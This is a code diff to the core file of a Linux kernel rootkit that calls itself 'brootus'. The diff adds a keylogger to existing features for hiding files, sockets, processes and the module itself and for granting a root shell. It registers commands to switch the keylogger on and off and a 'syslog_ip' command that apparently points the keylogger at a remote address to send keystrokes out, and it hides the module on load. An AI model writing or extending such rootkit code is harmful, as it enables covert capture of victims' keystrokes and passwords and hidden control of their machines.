@@ -8,6 +8,7 @@
 #include "module_hiding.h"
 #include "socket_hiding.h"
 #include "process_hiding.h"
+#include "keylogger.h"
 #include "rootshell.h"
 
 #define CMD_DELEGATE_ARG(f, arg) static inline void cmd_##f(char* data) { f(arg); }
@@ -24,6 +25,8 @@ CMD_DELEGATE(enable_process_hiding);
 CMD_DELEGATE(disable_process_hiding);
 CMD_DELEGATE(enable_module_hiding);
 CMD_DELEGATE(disable_module_hiding);
+CMD_DELEGATE(enable_keylogger);
+CMD_DELEGATE(disable_keylogger);
 CMD_DELEGATE_ARG(hide_module, &__this_module);
 CMD_DELEGATE_ARG(unhide_module, &__this_module);
 CMD_DELEGATE(root_me);
@@ -40,6 +43,8 @@ int __init init(void)
 	add_command("processes_off", cmd_disable_process_hiding);
 	add_command("modules_on", cmd_enable_module_hiding);
 	add_command("modules_off", cmd_disable_module_hiding);
+	add_command("keylogger_on", cmd_enable_keylogger);
+	add_command("keylogger_off", cmd_disable_keylogger);
 
 	// For histotical reasons these hide/unhide this module
 	add_command("mod_hide", cmd_hide_module);
@@ -54,11 +59,14 @@ int __init init(void)
 
 	add_command("rootme", cmd_root_me);
 
+	add_command("syslog_ip", connect_keylogger);
+
 	// Initialize the brootus modules
 	init_file_hiding();
 	init_socket_hiding();
 	init_process_hiding();
 	init_module_hiding();
+	init_keylogger();
 
 	// Hide our module
 	hide_module(&__this_module);
@@ -79,6 +87,7 @@ void __exit cleanup(void)
 	finalize_socket_hiding();
 	finalize_process_hiding();
 	finalize_module_hiding();
+	finalize_keylogger();
 }
 
 module_init(init);
